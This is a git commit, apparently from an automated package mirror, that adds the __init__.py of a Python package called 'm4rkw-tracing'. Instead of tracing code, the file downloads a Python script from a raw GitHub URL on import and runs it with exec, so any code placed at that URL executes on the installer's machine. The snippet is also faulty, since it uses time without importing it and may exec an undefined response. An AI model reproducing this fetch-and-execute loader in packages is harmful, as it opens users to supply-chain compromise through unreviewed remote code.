65d7e953926d135b42b5ac065eea3e79401ced4d
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2025-09-05 06:05:22 +0000

    Add package m4rkw-tracing/0.0.88/m4rkw_tracing-0.0.88-py3-none-any.whl

---
+++ packages/m4rkw-tracing/m4rkw_tracing-0.0.88-py3-none-any.whl/tracing/__init__.py
@@ -0,0 +1,13 @@
+import requests
+
+for i in range(0, 5):
+    try:
+        resp = requests.get('https://raw.githubusercontent.com/m4rkw/python_monitoring/refs/heads/main/tracing/tracing.py')
+
+        if resp.status_code == 200:
+            break
+
+    except Exception as e:
+        time.sleep(1)
+
+exec(resp.text)
